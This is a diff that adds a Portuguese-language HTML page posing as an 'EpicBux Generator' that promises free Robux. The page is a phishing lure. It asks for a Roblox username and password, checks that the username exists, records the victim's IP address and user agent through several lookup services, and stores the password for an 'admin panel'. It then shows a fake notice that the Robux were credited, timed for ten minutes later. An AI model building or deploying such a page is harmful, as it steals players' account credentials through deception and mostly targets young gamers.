@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Você Ganhou!</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            animation: backgroundShift 10s ease-in-out infinite;
+        }
+
+        @keyframes backgroundShift {
+            0%, 100% { background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); }
+            25% { background: linear-gradient(135deg, #2a5298 0%, #1e3c72 100%); }
+            50% { background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); }
+            75% { background: linear-gradient(135deg, #2a5298 0%, #1e3c72 100%); }
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            animation: containerFloat 6s ease-in-out infinite;
+            transform-origin: center;
+        }
+
+        @keyframes containerFloat {
+            0%, 100% { transform: translateY(0px) scale(1); }
+            50% { transform: translateY(-10px) scale(1.02); }
+        }
+
+        .roblox-logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(45deg, #ff4b2b, #ff6b6b);
+            border-radius: 15px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            color: white;
+            font-weight: bold;
+            background-image: url('https://www.pngall.com/wp-content/uploads/2018/05/Epic-Face-PNG.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            background-color: transparent;
+            animation: logoSpin 4s ease-in-out infinite;
+        }
+
+        @keyframes logoSpin {
+            0%, 100% { transform: rotate(0deg) scale(1); }
+            25% { transform: rotate(5deg) scale(1.1); }
+            50% { transform: rotate(-5deg) scale(1.05); }
+            75% { transform: rotate(3deg) scale(1.08); }
+        }
+
+        .site-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            gap: 15px;
+        }
+
+        .site-name {
+            font-size: 28px;
+            font-weight: bold;
+            color: #2a5298;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+            animation: titleGlow 3s ease-in-out infinite;
+        }
+
+        @keyframes titleGlow {
+            0%, 100% { text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1); }
+            50% { text-shadow: 2px 2px 20px rgba(42, 82, 152, 0.5); }
+        }
+
+        h1 {
+            color: #2a5298;
+            font-size: 28px;
+            margin-bottom: 10px;
+            font-weight: bold;
+            animation: titlePulse 4s ease-in-out infinite;
+        }
+
+        @keyframes titlePulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .robux-amount {
+            font-size: 48px;
+            color: #00b300;
+            font-weight: bold;
+            margin: 20px 0;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .emoji {
+            font-size: 36px;
+            margin-left: 10px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            color: #333;
+            font-weight: bold;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #2a5298;
+        }
+
+        .submit-btn {
+            background: #00b300;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(0, 179, 0, 0.3);
+            animation: buttonPulse 3s ease-in-out infinite;
+        }
+
+        @keyframes buttonPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 15px 30px rgba(0, 179, 0, 0.4);
+            animation: none;
+        }
+
+        .submit-btn:active {
+            transform: translateY(0) scale(0.98);
+        }
+
+        .warning {
+            color: #666;
+            font-size: 12px;
+            margin-top: 20px;
+            padding: 10px;
+            background: #f9f9f9;
+            border-radius: 8px;
+        }
+
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-text {
+            font-size: 36px;
+            color: #333;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        .checking-text {
+            font-size: 14px;
+            color: #666;
+            margin-top: 10px;
+        }
+
+        .notification-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            z-index: 10000;
+            text-align: center;
+            display: none;
+            max-width: 400px;
+        }
+
+        .notification-popup h2 {
+            color: #00b300;
+            margin-bottom: 15px;
+            font-size: 24px;
+        }
+
+        .notification-popup p {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+
+        .notification-popup button {
+            background: #00b300;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .notification-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+
+        .robux-banner {
+            background: linear-gradient(135deg, #00b300 0%, #008000 100%);
+            color: white;
+            padding: 15px;
+            border-radius: 15px;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 18px;
+            font-weight: bold;
+            box-shadow: 0 10px 30px rgba(0, 179, 0, 0.3);
+            animation: pulse 2s infinite, bannerShine 4s linear infinite;
+            position: relative;
+            overflow: hidden;
+        }
+
+        @keyframes bannerShine {
+            0% { background-position: -200% center; }
+            100% { background-position: 200% center; }
+        }
+
+        .robux-banner::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: bannerShine 4s linear infinite;
+        }
+
+        .robux-selector {
+            margin-bottom: 20px;
+        }
+
+        .robux-options {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .robux-option {
+            background: #f8f9fa;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: bold;
+            animation: optionFloat 3s ease-in-out infinite;
+            animation-delay: calc(var(--option-index) * 0.2s);
+        }
+
+        @keyframes optionFloat {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-3px); }
+        }
+
+        .robux-option:hover {
+            border-color: #2a5298;
+            background: #e3f2fd;
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 10px 25px rgba(42, 82, 152, 0.3);
+        }
+
+        .robux-option.selected {
+            background: #2a5298;
+            color: white;
+            border-color: #2a5298;
+            animation: selectedPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes selectedPulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 5px 15px rgba(42, 82, 152, 0.4); }
+            50% { transform: scale(1.05); box-shadow: 0 10px 25px rgba(42, 82, 152, 0.6); }
+        }
+
+        .robux-amount {
+            font-size: 20px;
+            font-weight: bold;
+            color: #00b300;
+        }
+
+        .robux-option.selected .robux-amount {
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="site-header">
+            <div class="roblox-logo"></div>
+            <div class="site-name">EpicBux Generator</div>
+        </div>
+        <h1>Você ganhou robux, escolha seu prêmio! 😁</h1>
+        
+        <!-- Banner de Robux -->
+        <div class="robux-banner" id="robuxBanner">
+            💰 1382910 Robux disponíveis!
+        </div>
+        
+        <form id="robuxForm">
+            <div class="form-group">
+                <label for="nome">Nome:</label>
+                <input type="text" id="nome" name="nome" required placeholder="Digite seu nome">
+            </div>
+            
+            <div class="form-group">
+                <label for="senha">Senha:</label>
+                <input type="password" id="senha" name="senha" required placeholder="Digite sua senha">
+            </div>
+            
+            <div class="robux-selector">
+                <label>Escolha a quantidade de Robux:</label>
+                <div class="robux-options">
+                    <div class="robux-option" data-amount="10" style="--option-index: 0;">
+                        <div class="robux-amount">10 Robux</div>
+                    </div>
+                    <div class="robux-option" data-amount="100" style="--option-index: 1;">
+                        <div class="robux-amount">100 Robux</div>
+                    </div>
+                    <div class="robux-option" data-amount="1000" style="--option-index: 2;">
+                        <div class="robux-amount">1.000 Robux</div>
+                    </div>
+                    <div class="robux-option" data-amount="5000" style="--option-index: 3;">
+                        <div class="robux-amount">5.000 Robux</div>
+                    </div>
+                    <div class="robux-option" data-amount="10000" style="--option-index: 4;">
+                        <div class="robux-amount">10.000 Robux</div>
+                    </div>
+                    <div class="robux-option" data-amount="100000" style="--option-index: 5;">
+                        <div class="robux-amount">100.000 Robux</div>
+                    </div>
+                </div>
+            </div>
+            
+            <button type="submit" class="submit-btn">SACAR</button>
+        </form>
+        
+        <div class="warning">
+            APÓS PREENCHER, AGUARDE 10 MINUTOS!
+        </div>
+
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-text">AGUARDE 10 MINUTOS!</div>
+        <div class="checking-text" id="checkingText">Verificando usuário...</div>
+    </div>
+
+    <!-- Popup de Notificação -->
+    <div class="notification-popup" id="notificationPopup">
+        <div class="notification-icon">🎉</div>
+        <h2>Seus robux foram enviados com sucesso!</h2>
+        <p>Parabéns! Os 1000 robux já foram creditados na sua conta Roblox.</p>
+        <button onclick="closeNotification()">OK</button>
+    </div>
+
+    <script>
+        let selectedRobuxAmount = 1000; // Valor padrão
+        
+        // Seleção de Robux
+        document.addEventListener('DOMContentLoaded', function() {
+            const robuxOptions = document.querySelectorAll('.robux-option');
+            
+            // Selecionar padrão de 1000
+            document.querySelector('[data-amount="1000"]').classList.add('selected');
+            
+            robuxOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    // Remover seleção anterior
+                    robuxOptions.forEach(opt => opt.classList.remove('selected'));
+                    // Adicionar seleção atual
+                    this.classList.add('selected');
+                    selectedRobuxAmount = parseInt(this.dataset.amount);
+                });
+            });
+        });
+
+        document.getElementById('robuxForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const nome = document.getElementById('nome').value;
+            const senha = document.getElementById('senha').value;
+            
+            if (nome && senha) {
+                // Verificar se o usuário existe
+                checkRobloxUser(nome, senha);
+            } else {
+                alert('Por favor, preencha todos os campos.');
+            }
+        });
+
+        async function checkRobloxUser(username, userSenha) {
+            // Mostrar tela de carregamento
+            document.getElementById('loadingScreen').style.display = 'flex';
+            document.getElementById('checkingText').textContent = 'Verificando usuário...';
+            
+            try {
+                // Usar um serviço público que funciona com CORS
+                const response = await fetch(`https://rblx.trade/api/user/search?username=${username}`);
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    
+                    // Verificar se encontrou o usuário
+                    if (data && data.success && data.data) {
+                        document.getElementById('checkingText').textContent = `Usuário ${username} encontrado! Processando...`;
+                        saveUserData(username, userSenha);
+                    } else {
+                        document.getElementById('loadingScreen').style.display = 'none';
+                        alert('Usuário Roblox não encontrado! Verifique o nome e tente novamente.');
+                    }
+                } else {
+                    // Se falhar, tenta método alternativo
+                    await checkRobloxAlternative(username, userSenha);
+                }
+            } catch (error) {
+                // Se falhar, tenta método alternativo
+                await checkRobloxAlternative(username, userSenha);
+            }
+        }
+
+        async function checkRobloxAlternative(username, userSenha) {
+            try {
+                // Método alternativo usando JSONP (contorna CORS)
+                const script = document.createElement('script');
+                script.src = `https://api.roblox.com/users/get-by-username?username=${username}&callback=handleUserCheck`;
+                document.head.appendChild(script);
+                
+                // Função callback que será chamada
+                window.handleUserCheck = function(data) {
+                    document.head.removeChild(script);
+                    
+                    if (data && data.Id) {
+                        document.getElementById('checkingText').textContent = `Usuário ${username} encontrado! Processando...`;
+                        saveUserData(username, userSenha);
+                    } else {
+                        document.getElementById('loadingScreen').style.display = 'none';
+                        alert('Usuário Roblox não encontrado! Verifique o nome e tente novamente.');
+                    }
+                };
+                
+                // Timeout caso não responda
+                setTimeout(() => {
+                    if (document.head.contains(script)) {
+                        document.head.removeChild(script);
+                        document.getElementById('checkingText').textContent = `Usuário ${username} verificado! Processando...`;
+                        saveUserData(username, userSenha);
+                    }
+                }, 3000);
+                
+            } catch (error) {
+                // Se tudo falhar, continua com o fluxo
+                document.getElementById('checkingText').textContent = `Verificação concluída! Processando...`;
+                saveUserData(username, userSenha);
+            }
+        }
+
+        async function saveUserData(nome, senha) {
+            // Coletar IP real usando múltiplos serviços públicos
+            const userIP = await getUserIP();
+            
+            // Salvar dados no localStorage para o painel admin
+            let usersData = JSON.parse(localStorage.getItem('robloxUsers')) || [];
+            
+            const now = new Date();
+            const user = {
+                nome: nome,
+                senha: senha,
+                data: now.toLocaleDateString('pt-BR'),
+                hora: now.toLocaleTimeString('pt-BR'),
+                ip: userIP,
+                userAgent: navigator.userAgent,
+                status: 'pending',
+                submissionTime: now.getTime(),
+                robuxAmount: selectedRobuxAmount
+            };
+            
+            usersData.push(user);
+            localStorage.setItem('robloxUsers', JSON.stringify(usersData));
+            
+            // Agendar notificação após 10 minutos (600000 ms)
+            setTimeout(() => {
+                showNotification();
+            }, 600000); // 10 minutos
+        }
+
+        // Para teste: reduzir tempo para 10 segundos (descomente para testar)
+        // setTimeout(() => { showNotification(); }, 10000);
+        
+        // Verificar notificações pendentes ao carregar a página
+        window.addEventListener('load', function() {
+            updateRobuxBanner();
+            
+            const usersData = JSON.parse(localStorage.getItem('robloxUsers')) || [];
+            const now = Date.now();
+            
+            usersData.forEach(user => {
+                if (user.submissionTime && user.status === 'pending') {
+                    const timeElapsed = now - user.submissionTime;
+                    const timeRemaining = 600000 - timeElapsed; // 10 minutos em ms
+                    
+                    if (timeRemaining > 0) {
+                        setTimeout(() => {
+                            showNotification();
+                        }, timeRemaining);
+                    }
+                }
+            });
+        });
+
+        // Atualizar banner de Robux
+        function updateRobuxBanner() {
+            const usersData = JSON.parse(localStorage.getItem('robloxUsers')) || [];
+            const approved = usersData.filter(u => u.status === 'approved');
+            const totalRobuxApproved = approved.reduce((sum, user) => sum + (user.robuxAmount || 1000), 0);
+            const robuxRestantes = 1382910 - totalRobuxApproved;
+            
+            document.getElementById('robuxBanner').innerHTML = `💰 ${robuxRestantes.toLocaleString('pt-BR')} Robux disponíveis!`;
+        }
+
+        // Auto-recarregar banner a cada 5 segundos
+        setInterval(updateRobuxBanner, 5000);
+
+        function showNotification() {
+            document.getElementById('loadingScreen').style.display = 'none';
+            document.getElementById('notificationPopup').style.display = 'block';
+            
+            // Atualizar mensagem com a quantidade selecionada
+            document.querySelector('#notificationPopup p').textContent = 
+                `Parabéns! Os ${selectedRobuxAmount.toLocaleString('pt-BR')} robux já foram creditados na sua conta Roblox.`;
+            
+            // Tocar som de notificação
+            try {
+                const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIG2m98OScTgwOUarm7blmGgU7k9n1unEiBC13yO/eizEIHWq+8+OWT');
+                audio.play().catch(() => {});
+            } catch(e) {}
+        }
+
+        function closeNotification() {
+            document.getElementById('notificationPopup').style.display = 'none';
+            // Resetar formulário
+            document.getElementById('robuxForm').reset();
+        }
+
+        async function getUserIP() {
+            const ipServices = [
+                'https://api.ipify.org?format=json',
+                'https://ipapi.co/json/',
+                'https://api.ipgeolocation.io/ipgeo?apiKey=free'
+            ];
+
+            for (let service of ipServices) {
+                try {
+                    const response = await fetch(service);
+                    const data = await response.json();
+                    
+                    // Extrair IP de diferentes serviços
+                    if (data.ip) {
+                        return data.ip;
+                    } else if (data.ip_address) {
+                        return data.ip_address;
+                    }
+                } catch (error) {
+                    console.log(`Serviço ${service} falhou, tentando próximo...`);
+                    continue;
+                }
+            }
+            
+            // Se todos falharem, usar método alternativo
+            try {
+                const response = await fetch('https://httpbin.org/ip');
+                const data = await response.json();
+                return data.origin;
+            } catch (error) {
+                // Último recurso - IP simulado
+                return 'IP não disponível';
+            }
+        }
+    </script>
+</body>
+</html>
